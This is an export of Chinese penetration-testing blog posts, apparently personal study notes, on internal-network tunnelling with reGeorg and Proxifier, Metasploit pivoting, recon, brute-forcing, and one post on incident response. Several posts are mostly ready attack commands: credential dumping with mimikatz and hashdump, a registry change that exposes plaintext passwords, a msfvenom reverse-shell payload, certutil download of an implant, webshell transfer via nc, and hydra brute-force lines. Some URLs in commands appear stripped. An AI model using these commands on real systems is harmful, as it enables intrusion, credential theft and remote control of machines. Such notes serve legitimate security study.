[{"title":"内网渗透代理","date":"2022-07-08T03:30:28.000Z","url":"/2022/07/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86/","categories":[[" ",""]],"content":"前言 在内网环境中,使用一些常规的内网反弹工具均被各大安全软件所拦截,尝试提权但无果,这时就需要一款内网代理和端口转发工具,穿越防火墙直连内网。 本文皆在学习内网渗透中 reGeorg+Proxifier 工具的使用。一、工具介绍 reGeorg是reDuh的继承者，利用了会话层的socks5协议，而Proxifier是一款强大的socks5客户端，可以让不支持通过代理服务器工作的网络能通过HTTPS或SOCKS代理或代理链。该文件下支持php，asp，jsp，aspx。 内网转发工具大体分为：端口转发工具(lcx.exe)，Web代理脚本，Shell反弹脚本等 reGeorg的出现，极大的方便了安全测试代理进内网。现在使用reGeorg和Proxifier，在安全测试过程中，可以利用它们的组合来完成从外网到内网的通信。二、正向代理和反向代理正向代理和反向代理的区别1、正向代理是一个位于客户端和原始服务器之间的服务器,为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端，客户端才能正向代理；2、反向代理是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器；如何进行内网穿透：(1) 反向代理：将内网的流量转发到外网(2) 正向代理：以某台机器为跳板，做正向代理进行内网穿透四、reGeorg使用方法先将reGeorg的对应脚本上传到服务器端，reGeorg提供了PHP、ASPX、JSP脚本，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常。运行命令提示符下切换到C:\\Python27\\，运行 python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口) -l(本地地址)，参数顺序无强制要求由于是基于socks5,本地还需安装一个socks5代理工具此类工具网上很多，就以 Proxifier为例子监听代理时候注意规则以Proxifier为例子，将python.exe添加列外，不然会死循环。下面我们配置Proxifier，运行Proxifier之后设置代理。第一步设置代理服务器，127.0.0.1 + -p指定的端口第二步设置代理规则（推荐），动作这里会有三个状态，Direct（放行），Block（阻塞），Proxy（代理）。这里可以设置需要代理的，以及放行的程序。五、应用场景例如有一台主机运行了web服务IP映射到公网任何人都可以任意访问，还有一台主机是内网中的主机外部访问不到。假设在公网的web主机已经上传了webshell，但无法反弹shell，无法直接将内网主机通过端口映射到外网主机。reGeorg这时就起作用了，通过上传reGeorg文件在web服务运行，使得攻击者发出的请求以及目标机器的响应经web服务的http转发，达到攻击者可以和内网主机进行通信的效果。 多层代理 方法一:matesploit路由转发·如果已经拿到了一台内网服务器，需要使用MSF去访问内网资源，这时候就需要在msf中添加去往“内网网段”的路由。MSF路由转发实现过程:1．需要获得一个msf的session会话2．获取内网的地址网段3．在msf中添加“内网网段”的路由命令:-run autoroute -s目标网段#添加路由. run autoroute -p#查看路由表注意:。通过MSF自带的autoroute功能自动添加路由只有MSF能访问到第二层的内网方法二:设置Socks代理概述:通过socks4模块添加socks代理，然后通过proxychains和浏览器代理使所有应用都可以通过代理访问到第二层内网·模块: auxiliary/server/socks4a 过程:1．使用socks4a模块;use auxiliary/server/socks4a2．设置监听端口set SRVPORT端口号3．开始执行: exploit·此时通过meterpreter隧道开了一个代理，这个代理端口默认开在本机·连上代理相当于可以访问msf上下文的所有路由，即可以访问之前通过autoroute添加的路由"},{"title":"hash获取","date":"2022-06-06T07:23:35.000Z","url":"/2022/06/06/hash%E8%8E%B7%E5%8F%96/","categories":[[" ",""]],"content":"本机密码获取主机HASH(注意,获取hash需要在管理员权限下运行!)meterpreter获取hash (1)hashdump (2)run post/windows/gather/smart_hashdump (3)run post/windows/gather/hashdump (4)load kiwi help creds_msv kiwi_cmd “privilege::debug” kiwi_cmd “sekurlsa::msv” (6)离线方式导出SAM reg save HKLM\\SAM sam.txt reg save HKLM\\SYSTEM system.txt 使用本地mimikatz来识别 mimikatz.exe “lsadump::sam /system:system.txt /sam:sam.txt” exit meterpreter kiwi_cmd “lsadump::sam /system:system.txt /sam:sam.txt” (7)LaZagneladon等等 明文密码获取 (1)MSF creds_all kiwi_cmd “privilege::debug” “sekurlsa::logonpasswords”(2)getpassword(3)wce -w(4)mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit”(只有登录过的账号还有可能获取其明文密码) 高版本系统密码获取 win2012R2 2016 2020 10 11win7 8 2008 2008r2 +KB2871997 以上情况系统默认禁用 Wdigest Auth，没法直接获取明文密码，因为lassa.exe不会直接保存明文密码 Step 1:修改注册表：修改为1reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f step 2：关机、锁屏rundll32 user32.dll LockWorkStation powershell -c “IEX (New-Object Net.WebClient).DownloadString(‘;);&quot; Lock-WorkStation.ps1内容如下： step 3:登录系统，再次使用mimikatz.exe获取明文密码"},{"title":"msf提权","date":"2022-06-06T03:57:12.000Z","url":"/2022/06/06/msf%E6%8F%90%E6%9D%83/","categories":[[" ",""]],"content":"(5)msf msfvenom 生成木马/shellcodemsfconsole 进入到MSF的终端，做一些测试或者参数设置 生成木马：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.103 LPORT=1234 -f exe -o evil.exe 开启web服务器php -S 0.0.0.0:9090 上传木马 -urlcache -split -f  c:/windows/temp/eee.exe kali监听端口handler -p windows/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 1234 上线木马MS14-058-x64.exe c:/windows/temp/eee.exe 验证权限sessions -i 1 -c “whoami”"},{"title":"系统中文件的传输","date":"2022-06-06T02:13:29.000Z","url":"/2022/06/06/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%A0%E8%BE%93/","categories":[[" ",""]],"content":"系统中文件的传输 一般写文件的位置： windows c:\\windows\\temp linux /tmp 搭建简易WEB服务器： 除了WAMP、LAMP、WNMP、lnmp之外 php -S 0.0.0.0:8090 python2 -m SimpleHTTPServer 8090 python3 -m http.serverr 9090 常见的写文件方法： linux wget  curl  -o /tmp/shell.php axal  aria2  攻击机：cat webshell.php|nc -l 1234 目标机：nc 攻击机_ip 1234 &gt; /tmp/webconf.php ftp linux_server_ip 等等 "},{"title":"应急相应","date":"2022-05-23T00:55:16.000Z","url":"/2022/05/23/%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94/","categories":[[" ",""]],"content":"windows应急响应：1.进程分析：在任务管理中，或者火绒剑等安全软件中查看，cpu内存资源查看 systeminfo2.启动项：任务管理器中启动键下3.计划任务：控制面板-&gt;系统和安全-&gt;管理工具下有计划任务4.网络排查：cmd中 netstat -noe 通过网络找进程，通过进程找文件打开任务管理器使用Ctrl+Alt+delete或者在windows下面状态栏右键选择任务管理器打开，通过点击详细信息，pid排序找到要找的pid来关闭恶意程序。5.样本识别网站：www.virscan.org 微步云沙箱 D盾（webshell查杀工具）6.日志分析：·系统日志：事件查看器：4624登陆成功 4625登陆失败 4634注销成功 4672超级管理员登录 4720创建用户 登录类型 2-交互登录 3-网络登录 10-远程登录 ·web日志：1.外部暴力脆弱网站 2.植入后门 3.提权 4.权限维持 5.控制主机，内网扫描apache日志：access.log7.系统账号：net user Linux应急响应：1.进程分析：ps -aux lsof -p pid号 lsof -i @localhost:20,80 -r3 监听端口2.端口：netstat -pantu 展示所有tcp,udp活跃的ip和端口号3.后门排查：find 路径 -name “.php”|xargs eprep ‘eval’4.文件路径：ls -l /proc/pid号/exe 查询具体文件在什么位置5.系统命令：history6.工具查杀：河马 深信服-webshellkiller openrasp7.日志分析：系统日志 在/var/log/下 主要关注grep “useradd” /var/log/secure(找到增加用户的日志) grep “userdel” /var/log/secure(找到删除用户的日志) grep “Failed password for root” /var/log/secure(登录用户失败日志)web日志8.敏感文件：用户文件/etc/passwd 密码文件/etc/shadow 计划任务文件/etc/crontab ls /etc/corn.9.查看系统服务：chkconfig –list"},{"title":"暴力破解","date":"2022-05-10T07:48:47.000Z","url":"/2022/05/10/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%8F%8A%E5%AD%97%E5%85%B8%E9%93%BE%E6%8E%A5/","categories":[[" ",""]],"content":"BurpSuite暴力破解B/S 爆破C/S服务的工具和平台 C/s ftpsshrdpredismysql(外连)等hydra -hSupported services: adam6500 asterisk cisco cisco-enable cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp已经账号，root hydra -l root -P pwd.txt  hydra -l root -P pwd.txt 192.168.1.1 ftp hydra -l root -P top1000.txt -e ns -v -t 1 192.168.10.2 mysql hydra -P top1000.txt -e ns -v -t 5 192.168.10.101 redis 中间件常见弱口令： 弱口令TOP100：登录账号/TOP100.txt 弱口令TOP1000：登录账号/top1000.txt 用户名TOP500：登录账号/Top500用户名.txt 键盘组合TOP100：登录账号/键盘组合TOP100.txt 符合条件的强弱密码合集： 中间件常见弱口令： Tomcat、Wenlogic、Jboss：中间件 数据库常见弱口令： MySQL、SQL Server、DB2、Mongo DB、Oracle、PostgreSQL：数据库 SQLServer： 端口服务类弱口令： 3389、FTP、POP3、RDP、SMB、SNMP、TELNET、phpmyadmin、ssh、system等：端口服务 网络设备弱口令： H3C、IOT、路由器、Wi-Fi、华为安全产品、国内防火墙默认密码等：网络设备 其他弱口令： 万能密码：万能密码 后门密码：其他、（433616）.txt 强弱字典组合： 高效手机号码：高效手机号码.txt SNETCraker—超级弱口令检查工具 下载地址： WebCrack——网站后台弱口令扫描工具 下载地址： hydra—弱口令爆破工具 下载地址： Linux： Windows： Go-x-crack—一款GO编写的常见服务的弱口令扫描工具 下载地址： domainWeakPasswdCheck—域账号弱口令审计工具 下载地址： WeblogicWeakPwd—Weblogic弱口令批量检测工具 下载地址： pydictor—字典创建工具 下载地址： 中文版使用地址： 在线字典创建工具—针对单个账户的密码生成 利用、[]() 白鹿社工字典生成器—社工弱口令 下载地址： BurpSuite模块 jsEncrypter扩展——解决密码被加密处理问题 下载地址：） reCAPTCHA扩展-验证码处理 利用第三方识别服务识别验证码：。"},{"title":"信息收集","date":"2022-05-09T01:45:22.000Z","url":"/2022/05/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","categories":[[" ",""]],"content":"信息收集概述渗透的本质就是在做信息收集，目标资产信息收集的程度，决定渗透过程的复杂程度。目标主机信息收集的深度，决定后渗透权限持续把控。渗透的本质是信息收集，而信息收集整理为后续的情报跟进提供了强大的保证。—-Micropoor 什么是信息收集：通过各种方式获取所需要的信息，以便在后续的渗透过程更好的进行。因为只有我们掌握了目标网站或目标主机足够多的信息之后，才能更好地对其进行漏洞检测。正所谓，知己知彼百战百胜。 信息收集的方式 主动收集：与目标主机进行直接交互，从而拿到目标信息，缺点是会记录自己的操作信息被动收集 ：不与目标主机进行直接交互，通过搜索引擎或者社会工程等方式间接的获取目标主机的信息 收集内容包含如下但不限于： 服务器的配置信息网站的信息（包括网站注册人、目标网站系统、目标服务器系统、目标网站相关子域名、目标服务器所开放的端口等）只要与目标网站相关联的信息，都应该尽量去搜索等 常见的信息收集内容： 域名信息：收集域名相关的信息，如URL、IP、注册商家、注册人联系方式等；子域名：收集指定域名的三级、四级等子域名信息，主要结合业务去收集，采用爆破、搜索引擎、证书等方法去实施采集；端口信息探测：探测目标服务上开启的服务，以及服务的banner信息；铭感信息收集：探测目标资源的站点服务架构、JS接口、页面包含的链接、客户信息、邮箱等内容；安全防护判断：通过工具和手工的方式判断目标资源中开启的防护设备，如不同类型的WAF、防火墙、EDR、杀软等；指纹识别：识别目标资源的站点CMS类型、中间件类型、容器类型、服务类型、系统类型等；旁站以及C段探测：收集目标站点上开启的其他的网站信息，一台服务器上可能搭建多个站点，C段也是考虑到目标公司可能同时购买多个同段IP，C段探测有助于资产探测和安全测试；扫描敏感目录和文件：目标站点中可能存在敏感文件和目录，通过目录扫描工具获取这些敏感文件和目录，如phpinfo、robots.txt、readme.md、备份文件等等；组织架构信息：获取目标对象的内容人力资源架构，可实施社工、近源攻击等测试；历史漏洞信息：通过目标资源的banner信息来判断目标可能存在的漏洞问题，如根据CMS版本来查找exploit；社工信息：以欺骗、诱导等方式获取的社工信息，如目标人的身份信息、邮箱信息、管控系统的密码等；其他信息：微信小程序、APP、合作商、外包商、VPN等等 子域名收集域名信息（前置学习内容） 收集域名相关的信息，如URL、IP、注册商家、备案信息、注册人联系方式等；域名信息收集方法： 1、Whois查询：通过Whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，推荐线上一些查询网站，直接输入目标站点即可查询到相关信息（具体下页）。2、备案信息查询：国内网站注册需要向国家有关部门申请备案，防止网站从事非法活动，而国外网站不需要备案。3、IP反查：通过目标组织的域名查询IP，然后再通过IP反查域名的方式，查询此主机IP是否有其他网站。 域名信息收集方法–whois （1）站长之家域名WHOIS信息查询地址：（2）爱站网域名WHOIS信息查询地址：（3）腾讯云域名WHOIS信息查询地址：（4）美橙互联域名WHOIS信息查询地址：（5）爱名网域名WHOIS信息查询地址：（6）易名网域名WHOIS信息查询地址：（7）中国万网域名WHOIS信息查询地址： （8）西部数码域名WHOIS信息查询地址：（9）新网域名WHOIS信息查询地址：（10）纳网域名WHOIS信息查询地址：（11）中资源域名WHOIS信息查询地址：（12）三五互联域名WHOIS信息查询地址：（13）新网互联域名WHOIS信息查询地址：（14）国外WHOIS信息查询地址： 域名信息收集方法–备案信息查询 (1)企查查：(2)天眼查：(3)ICP备案查询-站长工具：(4)SEO综合查询-爱站：(5)批量查询-站长工具：(6)美国企业备案查询：(7)小蓝本： 域名信息收集方法–IP反查 (1)360威胁情报中心：(2)微步在线：(3)全球DNS搜索引擎：(4)ViewDns：(5)17CE性能检测平台：(6)RISKIQ:(7)Dnslytics:(8)Netcraft: 域名信息收集方法–浏览器插件 通过Chrome、FireFox等浏览器插件的使用，收集域名信息。常见的浏览器插件有：Myip.ms、TCPIPUTILS、DNSlytics、Shodan、Fofa等。 子域名收集常见方法子域名 子域名也就是二级目录，是指顶级域名下的域名。举例：tieba.baidu.com. . 为根域.com 为顶级域baidu 为二级域名tieba 为三级域名 顶级域名/一级域名：顶级域（或顶级域名，也称为一级域名），是互联网DNS等级之中的最高级的域，它保存于DNS根域的名字空间中。顶级域名是域名的最后一个部分，即是域名最后一点之后的字母，例如在这个域名中，[顶级域是.com]()。二级域名：除了顶级域名，还有二级域名，就是最靠近顶级域名左侧的字段。例如在这个域名中，example就是二级域名。子域名：子域名（或子域；英语：Subdomain）是在域名系统等级中，属于更高一层域的域。比如，mail.example.com和calendar.example.com是example.com的两个子域，而example.com则是顶级域.com的子域。凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域 子域名收集的意义：假设目标网络的规模比较大，或者直接对站点无法渗透时，可以先进入某个目标的某个子域，然后再想进办法迂回接近真正的目标。一台服务器上有很多个站点，这些站点之间没有必然的联系，是相互独立的，使用的是不同的域名（甚至端口都不同），但是它们却共存在一台服务器上。 收集方法 枚举–基于字典的枚举是一种查找带有通用名称的子域名的技术。搜索引擎–Google hacking，Bing搜索。第三方聚合服务–第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。其他–证书透明度、DNS域传输、文件泄露等 枚举通过域名枚举工具实现子域名发现的目标。使用工具进行域名枚举的关键在于字典是否足够齐全。 1、Layer子域名挖掘机：、OneForAll：、SubDomainsBrute：、Sublist3r：、ESD：、Dnsprobe：、Subfinder：、Massdns： 搜索引擎通过资源搜索引擎进行子域名发现，常见的搜索引擎如下： （1） 推荐指数：⭐️⭐️⭐️⭐️⭐️（2） 推荐指数：⭐️⭐️⭐️（3） 推荐指数：⭐️⭐️⭐️（4） 推荐指数：⭐️⭐️⭐️（5） 推荐指数：⭐️⭐️⭐️⭐️⭐️（6） 推荐指数：⭐️⭐️⭐️⭐️⭐️（7） 推荐指数：⭐️⭐️⭐️⭐️⭐️（8） 推荐指数：⭐️⭐️⭐️（9） 推荐指数：⭐️⭐️（10） 推荐指数：⭐️⭐️（11） 推荐指数：⭐️⭐（12） 推荐指数：⭐️⭐（13） 推荐指数：⭐️⭐️⭐ Google Hacking：GoogleHacking 作为常用且方便的信息收集搜索引擎工具，它是利用谷歌搜索强大，可以搜出不想被看到的后台、泄露的信息、未授权访问，甚至还有一些网站配置密码和网站漏洞等。掌握了Google Hacking基本使用方法，或许下一秒就是惊喜！基础使用方法 site: 找到与指定网站有联系的URLinurl：将返回url中含有关键词的网页intext：寻找正文中含有关键字的网页intitle：寻找标题中含有关键字的网页filetype：指定访问的文件类型 Google Hacking符号使用 （1）精确搜索：给关键词加上双引号实现精确匹配双引号内的字符（2）通配符：谷歌的通配符是星号“*”，必须在精确搜索符双引号内部使用。用通配符代替关键词或短语中无法确定的字词（3）点号匹配任意字符：点号“.”匹配的是匹配某个字符，不是字、短语等内容。（4）基本搜索符号约束： 加号“+”用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。关键词前加“-”减号,要求搜索结果中包含关键词,但不包含减号后的关键词，用关于搜索结果的筛选。（5）数字范围：用两个点号“..”表示一个数字范围。一般应用于日期、货币、尺寸、重量、高度等范围的搜索， 如：手机 2000..3000 元，注意“3000”与“元”之间必须有空格（6）布尔逻辑：或，符号“|” 在多个关键字中,只要有一个关键字匹配上即可；与，符号“&amp;”所有的关键字都匹配上才可以。 Google Hacking综合利用 查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username查找可注入点：site:域名 inurl:aspx|jsp|php|asp查找上传漏洞：site:域名 inurl:file|load|editor|Files找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit存在的数据库：site:域名 filetype:mdb|asp|#查看脚本类型：site:域名 filetype:asp|aspx|php|jsp intext:login japan site:360.cn intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username 子域名收集方法汇总 Google：site:target.com Bing: site:target.com FOFA：domain=”target.com“ 百度：intitle=公司名称/site:target.com 钟馗之眼：site=target.com 第三方聚合服务 第三方平台：利用第三方网站和一些博主提供服务进行子域名发现;权重综合查询：利用权重综合查询进行子域名发现;全国政府网站基本数据库：针对特定性质网站可通过全国政府网站基本数据库进行子域名发现。 第三方平台 权重综合查询爱站：站长工具： 全国政府网站基本数据库常用网站： 快速提取SSL证书里的域名echo ‘; | httpx -tls-probe -json -silent | jq .tls.dns_names echo ‘‘ | httpx -tls-probe -json -silent | jq -r ‘.[“tls-grab”]’.dns_names httpx 是一个快速且多用途的 HTTP 工具包，允许使用 retryablehttp 库运行多个探测器，它旨在通过增加线程来保持结果的可靠性。 jq是命令行 JSON 处理器 其他方法证书透明度公开日志枚举(在线平台) 证书透明度(Certificate Transparency, CT)是证书授权机构(CA) 的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址，这些也经常成为红队评估非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志。 （1）（2）（3）（4）（5） 证书透明度公开日志枚举（工具查询） 通过利用工具调用各个证书接口进行域名查询。 （1）Findomain：（2）OneForAll：（3）Sublist3r： DNS域传送漏洞 DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。若DNS服务器配置不当，可能导致攻击者获取某个域的所有记录。检测方法： （1）nslookup：nslookup -type=ns vulhub.org（2）dig：dig @192.168.48.130 -t axfr www.vulhub.org（3）nmap：nmap –script dns-zone-transfer.nse –script-args “ dns-zone-transfer.domain=vulhub.org“ -Pn -p 53 192.168.48.130 文件泄露网站根目录下的 crossdomain.xml 文件指明了远程 Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。有时候可以用来收集到一些与目标组织域名相关信息。 CDN识别和绕过CDN基本介绍CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。CND工作原理 CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。CDN的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。域名解析过程 传统访问：用户访问域名–&gt; 析IP–&gt; 目标主机简单模式 ：用户访问域名–&gt;CDN 节点–&gt;真实IP–&gt;目标主机360 网站卫士 :用户访问域名–&gt;CDN 节点（云WAF ）–&gt;真实IP–&gt;目标主机 CND判断ping/nslookup查看不同时段不同地域下ping或者nslookup的结果，ip不一样，则说明可能存在CDN。 在线平台Ping检测-站长工具：：：：：国内在线CDN云观测：国外在线CDNplanet：脚本探测xcdn： phpinfo等探针找到真实IPl.php、phpinfo.php 等探 类文件即可得到真实IP 地址 phpinfo.php 搜索SERVER_NAME。 CND绕过网站根域或者子域找真实IP一般情况下，CDN服务器是按流量收费的，管理员可能给一些主要业务的网站部署CDN，根域或者子域业务可能没有部署CDN，这种情况下可以收集其子域名来尝试获取真实IP地址。 Email服务器找真实IP在web服务器和email服务器在一起时可以通过email也获取其真实IP，如果不属于同一台服务器时获取的IP可能只是email服务器的地址。常见发送邮件的功能有：注册用户、找回密码等 域名历史解析录找真实IP查询目标域名历史解析录可能会找到部署CDN 前的解析记录（真实IP 地址）可用以下几个网站查 。（1）（2）（3）（4）（5）（6） FOFA查询网站标题找真实IP利用“FOFA 网络空 安全搜索引擎”搜索网站源代码中的title 标签内容即可得到真实IP 地址,title=”XXXXX”. 注意：先去网站中到找到标题，将标题复制过来在FOFA中查询。 Censys查询SSL证书找到真实IP利用“Censys 网络空间搜索引擎”搜索网站的SSL证书及HASH，在 上查找目标网站SSL证书的HASH，然后再用Censys 搜索 HASH 即可得到真实IP 地址。443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:XXXX.com 其他的方法（1）自建CDN节点服务器找到真实IP（2）分析目标C端寻找真实IP（3）利用目标网站的漏洞找到真实IP（4）社工CDN 控制台找到真实IP（5）Zmap全网扫描及F5 LTM解码法 WAF探测理论介绍WAF也即WEB应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。在必要的情况下还是可以对WAF进行探测，了解WAF的种类和版本，并尝试使用一些手段绕过WAF规则。测试方法：（1）手工Fuzzing–提交恶意数据，直接粗暴；（2）工具测试–WAFW00F、Nmap等 看图识别WAF Nmap探测WAFnmap -p80,443 –script=http-waf-detect target_ipnmap -p80,443 –script=http-waf-fingerprint target_ip wafw00fgit clone  wafw00fpython setup.py install 常用指纹识别工具1、Wafw00f：、Sqlmap：（Sqlmap可用来探测每种waf设备）3、xenoitx：（检测和利用xss漏洞的神器，waf检测也是其中的功能之一）4、Nmap：（使用命令nmap -p 80 –script http-waf-detect.nse www.xxx.com） 端口探测端口信息收集 开放端口——开放代表可通信，端口决定服务。 服务类型探测——服务类型决定了该服务可能存在的漏洞。 端口协议——自定义端口可迷惑扫描器，需要根据返回信息判断协议。 端口即服务，服务即端口 工具扫描对于收集目标系统及其端口状况可以使用工具来进行，其工作原理都是使用TCP或UDP等协议向目标端口发送指定标志位等数据包，等待目标返回数据包，以此来判断端口状态，示例如下：使用Nmap采集，命令为：nmap -A -v -T4 目标使用Masscan采集，命令为：masscan -p80 目标注：参数含义在后文中有详细介绍。 Nmap一款免费开源的网络扫描和嗅探工具，可用于主机存活探测、端口扫描、漏洞探测、应用与版探测、操作系统探测等，是网络安全评估工作必备的神器之一。Nmap支持各类操作系统，如Windows、Linux、macOS等，它可以使用TCP/IP协议栈指纹准确探测出目标主机信息 安装Nmap macOS: brew install nmapCentos: yum install nmapUbuntu: apt一get install nmap Nmap扫描方式 ТСР: -sT SYN: -sSACK: -sA UDP: -sURPC: -sR ICMP: -sPDisable Port Scan: -sn 参考手册： 工具扫描–Nmap常见的扫描语句nmap 192.168.211.0/24 扫描整个网段nmap 192.168.211.10-200扫描指定的网络nmap 192.168.211.10,100,200-230扫描10,100,200-300的网络nmap 192.168.1.0/24 10.10.10.0/24扫描不同网段nmap –sT 192.168.1.1 使用TCP全连接的方式，扫描过程需要三次握手 建立连接 则说明端口开放 扫描速度慢nmap –sS 192.168.1.1 使用SYN的数据包去检测，如果接收到ACK，则说明端口开放了nmap –sN 192.178.1.1 NULL扫描，发出的数据包不设置任何标识位注意：上述扫描的端口默认都是1-1000 -p 后跟指定端口 –p20,21,22,80,33 06 -p- = -p1-65535nmap –sV 192.168.1.1 探测服务版本nmap 192.168.1.1 &gt;./re.txtnmap 192.168.1.1 –oX re.htmlnmap –A 192.168.1.1 获取目标所有的详细结果。 全面扫描nmap –O 192.168.1.1 探测操作系统类型 –script 使用脚本去探测漏洞nmap –script smb-vuln-ms17-010 192.168.1.1 #永痕之蓝；nmap –script smb-check-vulns 192.168.1.1 #MS08-067；nmap –script ssl-heartbleed 192.168.1.1 #心脏滴血；nmap 目标 –script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute#扫描端口并且标记可以爆破的服务nmap 目标 –script=auth,vuln #判断常见的漏洞并扫描端口；nmap -sV -sP 192.168.85.0/24 #-sV服务版本，-sP发现扫描网络存活主机；nmap -sS -sV -T5 -A -p- 192.168.85.129 #-sS隐蔽扫描(半开syn)，-sV服务版本，-T 时间优化(0-5)等级，数字越大力度越强，-A 综合扫描，-p-全端口（1-65535）；输出：-oN -oX -oG nmap -iL dns_result.txt –script=auth,vuln,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute &gt; scan.txt #批量扫描端口和漏洞检测,根据对应开放的端口进行针对性漏洞挖掘 常用测试命令： Masscan前面已经介绍过Nmap，通过Nmap可以扫描存活主机以及服务等信息，但是扫描大范围的IP段时就非常耗时，此时可以使用Masscan进行扫描，该工具可以自定义TCP/IP协议栈，加快扫描的速度和效率。项目地址：安装使用： sudo apt-get install git make libpcap-devgit clone  masscansudo apt install cmakemake 常见测试命令：masscan –ports 1-10000 192.168.40.0/24 –adapter-ip 192.168.40.128masscan -p1-10000 192.168.18.1 –rate=10000 -oL out.txt –echo &gt;scan.confmasscan -c scan.conf 在kali中该工具是自带的，可以直接使用。常用参数如下：-p 自定义端口–rate自定义发包个数-oL 定义输出的文件–banners 探测banner信息–adapter-ip 指定发包的ip地址–adapter-port 指定发包的源端口–adapter-mac 指定发包的源mac地址–router-mac 指定网关的mac地址–exclude 指定ip地址黑名单，防止masscan扫描–excludefile 指定ip地址黑名单文件–includefile 读取一个范围列表进行扫描–wait 指定发送完包等待的时间–readscan 读取文件的目标进行扫描masscan -p1-10000 192.168.18.1 –rate=10000 -oL out.txt –echo &gt;scan.conf将扫描信息导入文件中masscan -c scan.conf开始扫描 Nmap和Masscan结合使用masscan做全端口开放检测，过出来端口信息后，用nmap进行服务信息识别masscan -p1-65535 192.168.10.1 –rate=1000 -e eth0 &gt; portsports=$(cat ports | awk -F “ “ ‘{print $4}’ | awk -F “/“ ‘{print $1}’ | sort -n | tr ‘\\n’ ‘,’ | sed ‘s/,$//‘)nmap -Pn -sV -sC -p$ports 192.168.10.1 ZMapzmap是一款扫描软件，由 Durumeric 领导密歇根大学研究团队开发，这种工具能令一台普通的服务器在短短 45 分钟时间里扫描 IPv4 网络空间上的每一个地址，叹为观止！扫描效率远远超过 Nmap 工具。 OS 安装方法 Fedora 19+ or EPEL 6+ sudo yum install zmap Debian 8+ or Ubuntu 14.04+ sudo apt install zmap Gentoo sudo emerge zmap macOS (using Homebrew) brew install zmap Arch Linux sudo pacman -S zmap 使用手册： 传言的基础条件: 1000Mbps的网络 网络运营商或者云供应商不将此机器判定为DDOS攻击者（大量对外发送TCP syn包） 实际情况，zmap扫了全部地址，指定10m，大概用了72小时。 ZMap会对于指定端口实施尽可能大速率的TCP SYN扫描。较为保守的情况下，对10,000个随机的地址的80端口以10Mbps的速度扫描 zmap –bandwidth=10M –target-port=80–max-targets=10000–output-file=results.csv zmap -B 10M -p 80 -n 10000 -o results.csv 